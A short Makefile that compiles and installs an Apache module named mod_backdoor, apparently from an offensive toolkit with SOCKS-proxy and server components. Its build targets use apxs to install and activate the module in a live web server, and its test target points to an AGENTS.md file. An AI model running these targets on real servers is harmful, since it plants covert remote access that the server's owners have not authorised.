.PHONY: test clean build-systemd build-non-systemd

test:
	@echo "No unit tests for this project. See AGENTS.md for testing guidance."

clean:
	rm -f *.lo *.slo *.o *.la .libs/* mod_backdoor.so

build-systemd:
	apxs -i -a -c mod_backdoor.c socks.c sblist.c sblist_delete.c server.c -Wl,-lutil

build-non-systemd:
	apxs -i -a -c -DNO_SYSTEMD mod_backdoor.c socks.c sblist.c sblist_delete.c server.c -Wl,-lutil
